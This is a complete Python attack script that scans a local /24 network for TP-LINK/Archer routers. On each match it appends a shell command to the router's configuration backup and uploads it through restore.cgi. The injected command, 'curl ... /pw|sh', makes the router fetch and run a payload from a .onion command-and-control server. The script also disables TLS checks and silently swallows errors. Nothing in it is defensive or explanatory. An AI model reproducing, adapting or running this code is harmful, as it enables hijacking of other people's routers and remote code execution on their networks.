#!/usr/bin/env python3
import requests
import threading
import time

C2_URL = "http://mxsyhzt2ytqa6vmwslkd4hcsbqgf22fhgllzkprx2453w7xejkhgjgyd.onion:8080"

session = requests.Session()
session.verify = False
session.timeout = 12
session.headers.update({'User-Agent': 'Mozilla/5.0'})

def flash_device(ip):
    try:
        url = f"http://{ip}/backup"
        r = session.get(url, timeout=10)
        if b"TP-LINK" in r.content or b"Archer" in r.content:
            payload = r.content + b"\x00curl -s " + C2_URL.encode() + b"/pw|sh &"
            files = {'file': ('backup.bin', payload)}
            post_url = f"http://{ip}/restore.cgi"
            session.post(post_url, files=files, timeout=30)
            print(f"[+] {ip} - Firmware injected")
    except Exception as e:
        pass

print("[*] Scanning 192.168.0.0/24...")
for i in range(1, 255):
    t = threading.Thread(target=flash_device, args=(f"192.168.0.{i}",))
    t.daemon = True
    t.start()
    time.sleep(0.05)